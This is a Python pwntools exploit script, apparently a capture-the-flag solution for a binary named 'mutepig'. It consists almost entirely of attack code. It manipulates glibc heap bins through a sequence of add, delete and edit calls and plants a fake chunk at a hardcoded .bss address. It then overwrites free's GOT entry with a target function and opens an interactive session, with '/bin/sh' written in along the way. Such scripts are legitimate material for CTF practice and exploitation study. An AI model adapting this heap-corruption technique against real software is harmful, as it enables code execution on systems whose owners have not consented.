from pwn import *
context.log_level = 'debug'
io = process('./mutepig')
 
def menu(idx):
    io.sendline(str(idx))
    #sleep(0.2)
 
def add(typ, content):
    menu(1)
    io.sendline(str(typ))
    #sleep(0.2)
    io.send(content)
 
def delete(idx):
    menu(2)
    #sleep(0.2)
    io.sendline(str(idx))
 
def edit(idx, content, name):
    menu(3)
    io.sendline(str(idx))
    #sleep(0.2)
    io.send(content)
    #sleep(0.5)
    io.send(name)
 

# make av->system_mem > 0xa00000
add(3, 'a' * 0x7)
delete(0)
add(3, 'b' * 0x7)
delete(1)
 
# free fast chunk and link to fastbins
add(1, 'd' * 0x7) # fast 2
add(2, 'f' * 0x7) # small 3
delete(2)
 
# Make fake_chunk on .bss and edit the fastbin's fd
g_buf = 0x602120
name = p64(0)
name += p64(0x11)
name += p64(0)
name += p64(0xfffffffffffffff1)
edit(2, p64(g_buf + 0x10)[:6], name)

gdb.attach(io)
# call malloc consolidate
delete(3)
 
# link unsorted bins to appropriate list
name = p64(0xfffffffffffffff0)
name += p64(0x10)
name += p64(0)
name += p64(0xa00001)
edit(2, 'c', name)
add(3, 'g' * 0x7)
name = p64(0xfffffffffffffff0)
name += p64(0x10)
name += p64(0)
name += p64(0xfffffffffffffff1)
edit(2, '/bin/sh', name)
#pause()
 
# overwrite the target variable
target = 0x6020c0
free_got = 0x602018
hack_addr = 0x4006e0
add(13337, 'a')
 
add(1, p64(free_got)[:6])
print 'now'
# edit free.got => hack
edit(0, p64(hack_addr)[:6], 'lowkey')
 
# call hack
delete(2)
io.interactive()
